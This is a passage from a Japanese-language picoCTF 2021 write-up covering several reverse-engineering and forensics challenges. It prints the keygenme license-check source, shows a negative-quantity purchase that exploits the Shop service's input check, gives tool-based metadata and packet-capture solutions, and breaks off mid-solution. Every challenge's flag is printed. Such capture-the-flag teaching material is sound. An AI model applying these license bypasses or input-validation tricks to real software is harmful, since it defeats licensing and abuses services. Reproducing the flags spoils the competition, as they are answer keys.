</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">&lt;br /&gt;&lt;br /&gt;
</span></span><span class="line"><span class="cl">## [Reverse]: keygenme-py (30 points)
</span></span><span class="line"><span class="cl">- - -
</span></span><span class="line"><span class="cl">### Challenge
</span></span><span class="line"><span class="cl">&gt; keygenme-trial.py
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">中身
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">```Python
</span></span><span class="line"><span class="cl">#============================================================================#
</span></span><span class="line"><span class="cl">#============================ARCANE CALCULATOR===============================#
</span></span><span class="line"><span class="cl">#============================================================================#
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import hashlib
</span></span><span class="line"><span class="cl">from cryptography.fernet import Fernet
</span></span><span class="line"><span class="cl">import base64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># GLOBALS --v
</span></span><span class="line"><span class="cl">arcane_loop_trial = True
</span></span><span class="line"><span class="cl">jump_into_full = False
</span></span><span class="line"><span class="cl">full_version_code = &#34;&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username_trial = &#34;PRITCHARD&#34;
</span></span><span class="line"><span class="cl">bUsername_trial = b&#34;PRITCHARD&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">key_part_static1_trial = &#34;picoCTF{1n_7h3_|&lt;3y_of_&#34;
</span></span><span class="line"><span class="cl">key_part_dynamic1_trial = &#34;xxxxxxxx&#34;
</span></span><span class="line"><span class="cl">key_part_static2_trial = &#34;}&#34;
</span></span><span class="line"><span class="cl">key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">star_db_trial = {
</span></span><span class="line"><span class="cl">  &#34;Alpha Centauri&#34;: 4.38,
</span></span><span class="line"><span class="cl">  &#34;Barnard&#39;s Star&#34;: 5.95,
</span></span><span class="line"><span class="cl">  &#34;Luhman 16&#34;: 6.57,
</span></span><span class="line"><span class="cl">  &#34;WISE 0855-0714&#34;: 7.17,
</span></span><span class="line"><span class="cl">  &#34;Wolf 359&#34;: 7.78,
</span></span><span class="line"><span class="cl">  &#34;Lalande 21185&#34;: 8.29,
</span></span><span class="line"><span class="cl">  &#34;UV Ceti&#34;: 8.58,
</span></span><span class="line"><span class="cl">  &#34;Sirius&#34;: 8.59,
</span></span><span class="line"><span class="cl">  &#34;Ross 154&#34;: 9.69,
</span></span><span class="line"><span class="cl">  &#34;Yin Sector CL-Y d127&#34;: 9.86,
</span></span><span class="line"><span class="cl">  &#34;Duamta&#34;: 9.88,
</span></span><span class="line"><span class="cl">  &#34;Ross 248&#34;: 10.37,
</span></span><span class="line"><span class="cl">  &#34;WISE 1506+7027&#34;: 10.52,
</span></span><span class="line"><span class="cl">  &#34;Epsilon Eridani&#34;: 10.52,
</span></span><span class="line"><span class="cl">  &#34;Lacaille 9352&#34;: 10.69,
</span></span><span class="line"><span class="cl">  &#34;Ross 128&#34;: 10.94,
</span></span><span class="line"><span class="cl">  &#34;EZ Aquarii&#34;: 11.10,
</span></span><span class="line"><span class="cl">  &#34;61 Cygni&#34;: 11.37,
</span></span><span class="line"><span class="cl">  &#34;Procyon&#34;: 11.41,
</span></span><span class="line"><span class="cl">  &#34;Struve 2398&#34;: 11.64,
</span></span><span class="line"><span class="cl">  &#34;Groombridge 34&#34;: 11.73,
</span></span><span class="line"><span class="cl">  &#34;Epsilon Indi&#34;: 11.80,
</span></span><span class="line"><span class="cl">  &#34;SPF-LF 1&#34;: 11.82,
</span></span><span class="line"><span class="cl">  &#34;Tau Ceti&#34;: 11.94,
</span></span><span class="line"><span class="cl">  &#34;YZ Ceti&#34;: 12.07,
</span></span><span class="line"><span class="cl">  &#34;WISE 0350-5658&#34;: 12.09,
</span></span><span class="line"><span class="cl">  &#34;Luyten&#39;s Star&#34;: 12.39,
</span></span><span class="line"><span class="cl">  &#34;Teegarden&#39;s Star&#34;: 12.43,
</span></span><span class="line"><span class="cl">  &#34;Kapteyn&#39;s Star&#34;: 12.76,
</span></span><span class="line"><span class="cl">  &#34;Talta&#34;: 12.83,
</span></span><span class="line"><span class="cl">  &#34;Lacaille 8760&#34;: 12.88
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def intro_trial():
</span></span><span class="line"><span class="cl">    print(&#34;\n===============================================\n\
</span></span><span class="line"><span class="cl">Welcome to the Arcane Calculator, &#34; + username_trial + &#34;!\n&#34;)    
</span></span><span class="line"><span class="cl">    print(&#34;This is the trial version of Arcane Calculator.&#34;)
</span></span><span class="line"><span class="cl">    print(&#34;The full version may be purchased in person near\n\
</span></span><span class="line"><span class="cl">the galactic center of the Milky Way galaxy. \n\
</span></span><span class="line"><span class="cl">Available while supplies last!\n\
</span></span><span class="line"><span class="cl">=====================================================\n\n&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def menu_trial():
</span></span><span class="line"><span class="cl">    print(&#34;___Arcane Calculator___\n\n\
</span></span><span class="line"><span class="cl">Menu:\n\
</span></span><span class="line"><span class="cl">(a) Estimate Astral Projection Mana Burn\n\
</span></span><span class="line"><span class="cl">(b) [LOCKED] Estimate Astral Slingshot Approach Vector\n\
</span></span><span class="line"><span class="cl">(c) Enter License Key\n\
</span></span><span class="line"><span class="cl">(d) Exit Arcane Calculator&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    choice = input(&#34;What would you like to do, &#34;+ username_trial +&#34; (a/b/c/d)? &#34;)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    if not validate_choice(choice):
</span></span><span class="line"><span class="cl">        print(&#34;\n\nInvalid choice!\n\n&#34;)
</span></span><span class="line"><span class="cl">        return
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    if choice == &#34;a&#34;:
</span></span><span class="line"><span class="cl">        estimate_burn()
</span></span><span class="line"><span class="cl">    elif choice == &#34;b&#34;:
</span></span><span class="line"><span class="cl">        locked_estimate_vector()
</span></span><span class="line"><span class="cl">    elif choice == &#34;c&#34;:
</span></span><span class="line"><span class="cl">        enter_license()
</span></span><span class="line"><span class="cl">    elif choice == &#34;d&#34;:
</span></span><span class="line"><span class="cl">        global arcane_loop_trial
</span></span><span class="line"><span class="cl">        arcane_loop_trial = False
</span></span><span class="line"><span class="cl">        print(&#34;Bye!&#34;)
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        print(&#34;That choice is not valid. Please enter a single, valid \
</span></span><span class="line"><span class="cl">lowercase letter choice (a/b/c/d).&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def validate_choice(menu_choice):
</span></span><span class="line"><span class="cl">    if menu_choice == &#34;a&#34; or \
</span></span><span class="line"><span class="cl">       menu_choice == &#34;b&#34; or \
</span></span><span class="line"><span class="cl">       menu_choice == &#34;c&#34; or \
</span></span><span class="line"><span class="cl">       menu_choice == &#34;d&#34;:
</span></span><span class="line"><span class="cl">        return True
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        return False
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def estimate_burn():
</span></span><span class="line"><span class="cl">  print(&#34;\n\nSOL is detected as your nearest star.&#34;)
</span></span><span class="line"><span class="cl">  target_system = input(&#34;To which system do you want to travel? &#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  if target_system in star_db_trial:
</span></span><span class="line"><span class="cl">      ly = star_db_trial[target_system]
</span></span><span class="line"><span class="cl">      mana_cost_low = ly**2
</span></span><span class="line"><span class="cl">      mana_cost_high = ly**3
</span></span><span class="line"><span class="cl">      print(&#34;\n&#34;+ target_system +&#34; will cost between &#34;+ str(mana_cost_low) \
</span></span><span class="line"><span class="cl">+&#34; and &#34;+ str(mana_cost_high) +&#34; stone(s) to project to\n\n&#34;)
</span></span><span class="line"><span class="cl">  else:
</span></span><span class="line"><span class="cl">      # TODO : could add option to list known stars
</span></span><span class="line"><span class="cl">      print(&#34;\nStar not found.\n\n&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def locked_estimate_vector():
</span></span><span class="line"><span class="cl">    print(&#34;\n\nYou must buy the full version of this software to use this \
</span></span><span class="line"><span class="cl">feature!\n\n&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def enter_license():
</span></span><span class="line"><span class="cl">    user_key = input(&#34;\nEnter your license key: &#34;)
</span></span><span class="line"><span class="cl">    user_key = user_key.strip()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    global bUsername_trial
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    if check_key(user_key, bUsername_trial):
</span></span><span class="line"><span class="cl">        decrypt_full_version(user_key)
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        print(&#34;\nKey is NOT VALID. Check your data entry.\n\n&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def check_key(key, username_trial):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    global key_full_template_trial
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if len(key) != len(key_full_template_trial):
</span></span><span class="line"><span class="cl">        return False
</span></span><span class="line"><span class="cl">    else:
</span></span><span class="line"><span class="cl">        # Check static base key part --v
</span></span><span class="line"><span class="cl">        i = 0
</span></span><span class="line"><span class="cl">        for c in key_part_static1_trial:
</span></span><span class="line"><span class="cl">            if key[i] != c:
</span></span><span class="line"><span class="cl">                return False
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        # TODO : test performance on toolbox container
</span></span><span class="line"><span class="cl">        # Check dynamic part --v
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[5]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[3]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[6]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[2]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[7]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[1]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            i += 1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        if key[i] != hashlib.sha256(username_trial).hexdigest()[8]:
</span></span><span class="line"><span class="cl">            return False
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        return True
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def decrypt_full_version(key_str):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    key_base64 = base64.b64encode(key_str.encode())
</span></span><span class="line"><span class="cl">    f = Fernet(key_base64)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    try:
</span></span><span class="line"><span class="cl">        with open(&#34;keygenme.py&#34;, &#34;w&#34;) as fout:
</span></span><span class="line"><span class="cl">          global full_version
</span></span><span class="line"><span class="cl">          global full_version_code
</span></span><span class="line"><span class="cl">          full_version_code = f.decrypt(full_version)
</span></span><span class="line"><span class="cl">          fout.write(full_version_code.decode())
</span></span><span class="line"><span class="cl">          global arcane_loop_trial
</span></span><span class="line"><span class="cl">          arcane_loop_trial = False
</span></span><span class="line"><span class="cl">          global jump_into_full
</span></span><span class="line"><span class="cl">          jump_into_full = True
</span></span><span class="line"><span class="cl">          print(&#34;\nFull version written to &#39;keygenme.py&#39;.\n\n&#34;+ \
</span></span><span class="line"><span class="cl">                 &#34;Exiting trial version...&#34;)
</span></span><span class="line"><span class="cl">    except FileExistsError:
</span></span><span class="line"><span class="cl">    	sys.stderr.write(&#34;Full version of keygenme NOT written to disk, &#34;+ \
</span></span><span class="line"><span class="cl">	                  &#34;ERROR: &#39;keygenme.py&#39; file already exists.\n\n&#34;+ \
</span></span><span class="line"><span class="cl">			  &#34;ADVICE: If this existing file is not valid, &#34;+ \
</span></span><span class="line"><span class="cl">			  &#34;you may try deleting it and entering the &#34;+ \
</span></span><span class="line"><span class="cl">			  &#34;license key again. Good luck&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def ui_flow():
</span></span><span class="line"><span class="cl">    intro_trial()
</span></span><span class="line"><span class="cl">    while arcane_loop_trial:
</span></span><span class="line"><span class="cl">        menu_trial()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Encrypted blob of full version
</span></span><span class="line"><span class="cl">full_version = \
</span></span><span class="line"><span class="cl">b&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">gAAAAABgT_nvf4P0-CFwlBsPrO8lFGYdOMPOsW49NMCVP4OQm4TqUiwWH6wolWNozf6wSudqEnLxlV6_tpyRrEDHQjBf05wp3N8eVOlkGtbYvQ1j3rJp5A-u68f04WfV-Tbx87qMXkicUYywezrlklzxOtOGeqatlaT9uQXVHu9FyZbYmcKGrpQ5gnGc-u278DYd2vmYgo8Y4gsf0DsRy3R3OhpI9oAYBtoThP6A2kwvggWAYUTNv6VQ3mcpwgwGqJP6tro8BHkGJVW2xQMiptJfXWdANIAQOoL9Xse3spqlSmnaZzTZ2nGpWtzPsGXXbBo2YRV1tRm4HNeS4VpSnHPVd5nNBe7hTckqs_ye1WkG58z1ldo7fvLDRudVMrjBYSsQHd64XMaq5KFZeKWtm0F6r5DYK5d5UFhZzZi8F7PIQZ481lgTb4QxBu0HvsMcjk9r10aeKHzMxYDEpq8o9xZXlBhYMB9N6919y2Deuk2-VICbc2RX5NMzBjIfqnwJvWG7w8ystaiN-BxATHHcvSuV6_3tsGqEbJi7wILo2sMBiAa_a3pLDnIovXhG3dqbxR0Ay9fQFSJvcUqqbyXcK5MPs52_iZWJ2wD27ac6EQP911pHwaE6N_7p3u8zHOzMk4LDSZJhADeotihRJYXuAw3laDfOVWo1H2JoLGfuU6--4PcJAqQz1ZRTXWEkP6hcd2UtXKZVF8kzGTRyl5KSbMoU2ZJGSXrVZMpjdFE5WON_ZBa-TAdw537NZvr-bVINw8oPmb39n3VYRQFB_bkuUHcgHqVaexTIrAVL10jJdyIQtVRaZdxWkmdhNNWgkhSXozz9oatq_PYVlb_6aiWD8co4l019-H8dhrZHqMUR06JryR3aDcV85eFKSQKWfs5gS67vJYfPj3V7SJVUtS30jGEjZQO8mmBnncBOX927pBxZKtwn111m9Ryr-Lwack7UWQj4JFIDgHwXghN7ScGQDc3BNQImfutCuVFf9MVOCb7QZru0icd7o3eEztFDPHOZQIKSDBq7zfmZBgppEFZjouAUO4d97hkcnSGf6nRM2oqhwt_9N5h_e3SntRNJGoPfHrjsWutGZO-2kaw6kFIVsL0QBdMDS2V8oFFCpMiNoWS1OvrILvzT-UGtQKtfmC0H-zR1CL3PQGfPbcgW08EmkuSPrZk-bKTucvz6r_9PxQPMznyhpm_5f1MhYt_eKkwpkRS9zChuNtb3vP2Qp3M5CUdWpxA3dNmrarihWka94RCuUDftROcBIWpNUrWci-fkDCzeYHwFs_qH3DK85dKpmQVnmHrrRG2rH9Y1jW2jpqmEHiZKjc6tQa2kmRVR9vDvaygFjDAzGk7b2h7nLFHCKPvJnvkw-yvSIL8GVHVTWhe2PhK983qu2RQIlL3R-27Xzx_pz_0OehnosqeZkY19T1Jzri2BcL9HYB_qAdniXONU36zj9ZiUs_Ffpq4OgiVw2-bBLIDEtpN2xSj2P7-An_Xjtbgr0ukMdEUjFLV4yScjaqDBM7kM1rE2l4fFPY0pEMy3aasIAJRL9mDS04jLDCsZn_BxxIlOpnVBvHZld_rRyRWtbN3UESj6jl2pHIxzgvMg9E8Eyt8XT7bgRfimMDrocMahrGhE018t3xTNDtNHgnoaD2t4DyqQr1pr6TcMKRxNqqXy3dEYvKDVhBmzFc00YKkT6bp0ufwpzlknFnEEmHh6QAoxdM5uD_3QEm1X67gtwoOXFtY3TSGJ9CzfWsOeQ_BjxyWJkm4W6b3SbnlJ68hsTXUk6Cc3uzoczgwCeyb6uSw5O9cHT-s5KTpHlnISkB0SYs4pZMHcQ-gq3URPYTeGP11KLfWCMuznCosYc3R7jriReKKOjFD2CU2Fc-i_CmlkRJ4tqDhKZFx3UhBCUQY4JVAOS8RQTb1T9qW-mNe8JcDEpPirqNMI_wL3EFWKyd8jQGM38mRjkq2p2jf9HRNVvmpyFNWxiOP8jsG3RvtiGS3Nv58D417EgRUCG_FEQiHRKmxjuUIAmpGEioln2Yf3sGYoBfvhwlZinTdpiVoUwjRAZdRXMvoYhRQnIT7ykQlTax64DS4RxHeFjaO6FyWMR3rDkRQSvMsUTzmFGVST564CfvSUHKPIz91SNcgbQoR5Y3-4GS50qX87sBu8ow-Z6zquzMDavkpBJzxrB1NX0Tez1SREt4ViK3Hi5Jvr1r8uKTDgjH62v5HBRZlqlMOQBXPBKAAMPUOqqsqKbil6NOiOADezhcYfc4Vy3N11AfL3mx2AIHpLfdtYcUzsuImPpAu6V75_zD5GdzGdb-N3uYPJrkKmQOoK61HsJQjVjgluoNHavR13fJ0FQWYJpEyn4P1Tuhkv4pgtYMtiXHwC6804DdsTMdgFrTR3K0E-xwDq0E68pkcebW7hZAuXE3Qhxviyb6BHx5E_recW3q2Od7_J_CSiECgf_0ykLuKZM4aQBLp7UM9aafK109Z6rwGDdsJ3_C5u0RIZ6gh5d_lRtWroUzsTryuM-XqRe_xuIbLzYBeAqSjovbKFIeev3vJ3KdNRVO65kBJUaOIGn7uv6Qv2am4Hfo-wu86J2wKyMaAUsL0TEyKKInh03rg1IQY84xdAEeqVSStn3fU5GdnxYrt-ByhvTNAoXhGGKPjzhzLdvgBB07Or9OtjvjyDByD8KFpolp1_TiMnDW6Rp66HQlqFgqgrEA0Ix3-nkU_R2yC8xR2QEvD2A9JxKKwc03NtwmlKi9NlslYKLS0g7lu3CombAx7AqAMIF__kM8czRVV9Np-IvDp2CZEArvryF_Oo0CKszZy2ngXZbSD1bobYDa6168yUNGyaL-nbDiB28QL1wiDjLL6vF-dYU2Q9-cVuE11bSZOzbARbr-oaMHC6QACNbs6vpF6Tq9tOJdEbUfAwXt-BEk3KlAW7mcYgpFvADD6ZdefN99lCoAJSljgy243CMEfw8WGfNUMh8uHKsmcHie089aiJLlzEs5o0MacV43ttbgBQ0rMD7e5KHf56dqDO0k15E9UsYsiniGbs8sNPRL-SQzpZqWBd4z2gEXc9_l7xMv_GpXBz4Dj7OJKu7TzD5Vvmd54wqWcMPo7MMIpMY6xyUIZgK9IvUc_dRkV9ze3FfaJi656TBo4Fw1MgURqyRx8kCUsMCqGJgftryPMA0iA0ha3_9dEIZKyJwt51I1JltO6GUQTMYa9nvmcbFyxH3XIgjjT2T8X1vrPZqYDJ0BMIV1OlweD_V69NjykDxa879r-SvSByONyeTrqe_yDfBKxjVJPPmSy9U9uIN8mjuPOjbHnnG_vjsACp22slbyv5Qc75znhhwQe7KuxCIuf3WfZi_WDMXxWKXaaM-Q4o8qM5B3Ak2lC1VyalFvUkLA-aUTrj1RgQ6FziAA14l9cQQu4hJJ0mOBdmcAd_cpbCkD2ADlA-IxYcIXflwDWf-WUO8b-QzuHie3g0V6dzlCN9B56w6XlwhkeTS4OQdmtIBVZvhqBXJpXzmHBLlHwirF4COCWSn5w_Q7D9z1kq0RjMyzqrq36UTVGjKfWxMKVvnd1RQkn3PsddwJG62Dfaty3td43RyTUvsGwrTglZWe7v6229eYxDXwmgbtJ_eWSjdcyr9i38diyOLbDzs6xvdLL4bjR5WqB4YBcNFlXMvnyJxt4hiyDvZriJpmtsa7O58-ReW4KkbDo1RjrL20GeFfiQELW_V-11gvPoyLIigmTt4oluCleUDLuZ0gkhRLY9ve9f8kmQDsMLWSM2S-0xq4Q3QQZrOAHYEme3o5iROA2EU5lYwQGXXJIiVsIYzQWC2ULrmqJ67ceCwUgPzdCT8qnnhTETGwGDxFlLbJRiiqpNQ3WeGgEHFSN2bLQypC5CZwowIg==
</span></span><span class="line"><span class="cl">&#34;&#34;&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Enter main loop
</span></span><span class="line"><span class="cl">ui_flow()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if jump_into_full:
</span></span><span class="line"><span class="cl">    exec(full_version_code)
</span></span></code></pre></td></tr></table>
</div>
</div><br />
<h3 id="solution-11">Solution</h3>
<p>フラグの一部がdynamicということで xxxxxxxx になってます。それ以外の部分はstaticで固定です。</p>
<p>check_key()関数の中で、正解のフラグと比較をしているので、printするなりして文字列を取得するだけです。</p>
<br />
<p>Flag: <code>picoCTF{1n_7h3_|&lt;3y_of_54ef6292}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="reverse-speeds-and-feeds-50-points">[Reverse]: speeds and feeds (50 points)</h2>
<hr>
<h3 id="challenge-11">Challenge</h3>
<blockquote>
<p>There is something on my shop network running at nc mercury.picoctf.net 7032, but I can&rsquo;t tell what it is. Can you?
<br /><br />
Hint: What language does a CNC machine use?</p>
</blockquote>
<pre>
$ nc mercury.picoctf.net 7032
G17 G21 G40 G90 G64 P0.003 F50
G0Z0.1
G0Z0.1
G0X0.8276Y3.8621
:
(長いので省略)
:
</pre>
<br />
<h3 id="solution-12">Solution</h3>
<p>G-codeっていうやつらしいです。</p>
<p>以下のサイトを使いました。<br /></p>
<p><a href="https://ncviewer.com/">https://ncviewer.com/</a></p>
<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_Gcode.png" alt="picoctf_2021_Gcode.png">
<br />
<p>Flag: <code>picoCTF{num3r1cal_c0ntr0l_a067637b}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="reverse-shop-50-points">[Reverse]: Shop (50 points)</h2>
<hr>
<h3 id="challenge-12">Challenge</h3>
<blockquote>
<p>Best Stuff - Cheap Stuff, Buy Buy Buy&hellip; Store Instance: source. The shop is open for business at nc mercury.picoctf.net 34938.
<br /><br />
Hint: Always check edge cases when programming</p>
</blockquote>
<br />
<h3 id="solution-13">Solution</h3>
<p>売るときにマイナス値を指定するとお金が増えます。</p>
<pre>
$ nc mercury.picoctf.net 34938
Welcome to the market!
=====================
You have 40 coins
	Item		Price	Count
(0) Quiet Quiches	10	12
(1) Average Apple	15	8
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
0
How many do you want to buy?
-6
You have 100 coins
	Item		Price	Count
(0) Quiet Quiches	10	18
(1) Average Apple	15	8
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125]
</pre>
<br />
<p>文字に変換。</p>
<pre>
$ python -c 'print("".join([chr(int(x)) for x in "112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125".split()]))'
picoCTF{b4d_brogrammer_ba6b8cdf}
</pre>
<br />
<p>Flag: <code>picoCTF{b4d_brogrammer_ba6b8cdf}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-information-10-points">[Forensics]: Information (10 points)</h2>
<hr>
<h3 id="challenge-13">Challenge</h3>
<blockquote>
<p>Files can always be changed in a secret way. Can you find the flag? cat.jpg</p>
</blockquote>
<br />
<h3 id="solution-14">Solution</h3>
<pre>
=== exiftool ===
ExifTool Version Number         : 12.00
File Name                       : cat.jpg
Directory                       : .
File Size                       : 858 kB
File Modification Date/Time     : 2021:03:17 09:15:41+09:00
File Access Date/Time           : 2021:03:17 09:24:53+09:00
File Inode Change Date/Time     : 2021:03:17 09:15:47+09:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Current IPTC Digest             : 7a78f3d9cfb1ce42ab5a3aa30573d617
Copyright Notice                : PicoCTF
Application Record Version      : 4
XMP Toolkit                     : Image::ExifTool 10.80
License                         : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
Rights                          : PicoCTF
Image Width                     : 2560
Image Height                    : 1598
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2560x1598
Megapixels                      : 4.1
</pre>
<p>cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 を Base64 decode します。</p>
<br />
<p>Flag: <code>picoCTF{the_m3tadata_1s_modified}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-matryoshka-doll-30-points">[Forensics]: Matryoshka doll (30 points)</h2>
<hr>
<h3 id="challenge-14">Challenge</h3>
<blockquote>
<p>Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another. What&rsquo;s the final one? Image: this</p>
</blockquote>
<br />
<h3 id="solution-15">Solution</h3>
<p>foremostとzipを根気よく繰り返すだけです。</p>
<br />
<p>Flag: <code>picoCTF{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-wireshark-doo-dooo-do-doo-50-points">[Forensics]: Wireshark doo dooo do doo&hellip; (50 points)</h2>
<hr>
<h3 id="challenge-15">Challenge</h3>
<blockquote>
<p>Can you find the flag? shark1.pcapng.</p>
</blockquote>
<br />
<h3 id="solution-16">Solution</h3>
<p>tcp.stream eq 5 に以下が見つかります。</p>
<p><code>Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}</code></p>
<br />
rot13すると、フラグが取れます。
<p><code>The flag is picoCTF{p33kab00_1_s33_u_deadbeef}</code></p>
<br />
<p>Flag: <code>picoCTF{p33kab00_1_s33_u_deadbeef}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-macrohard-weakedge-60-points">[Forensics]: MacroHard WeakEdge (60 points)</h2>
<hr>
<h3 id="challenge-16">Challenge</h3>
<blockquote>
<p>I&rsquo;ve hidden a flag in this file. Can you find it? Forensics is fun.pptm</p>
</blockquote>
<br />
<h3 id="solution-17">Solution</h3>
<p>fun.pptm を zip として解凍すると、以下が見つかります。</p>
<pre>
Forensics_is_fun/ppt/slideMasters/hidden
Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q
</pre>
<br />
<pre>
$ echo "Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q" | tr -d " " | base64 -d
flag: picoCTF{D1d_u_kn0w_ppts_r_z1p5}
</pre>
<br />
<p>Flag: <code>picoCTF{D1d_u_kn0w_ppts_r_z1p5}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="forensics-trivial-flag-transfer-protocol-90-points">[Forensics]: Trivial Flag Transfer Protocol (90 points)</h2>
<hr>
<h3 id="challenge-17">Challenge</h3>
<blockquote>
<p>Figure out how they moved the flag.
<br /><br />
Hint: What are some other ways to hide data?</p>
</blockquote>
<br />
<h3 id="solution-18">Solution</h3>
<p>Wiresharkでtftp objectをexportします。</p>
<pre>
$ file *
instructions.txt: ASCII text
picture1.bmp:     PC bitmap, Windows 3.x format, 605 x 454 x 24, image size 824464, resolution 5669 x 5669 px/m, cbSize 824518, bits offset 54
picture2.bmp:     data
picture3.bmp:     data
plan:             ASCII text
program.deb:      Debian binary package (format 2.0), with control.tar.gz, data compression xz
</pre>
<br />
<ul>
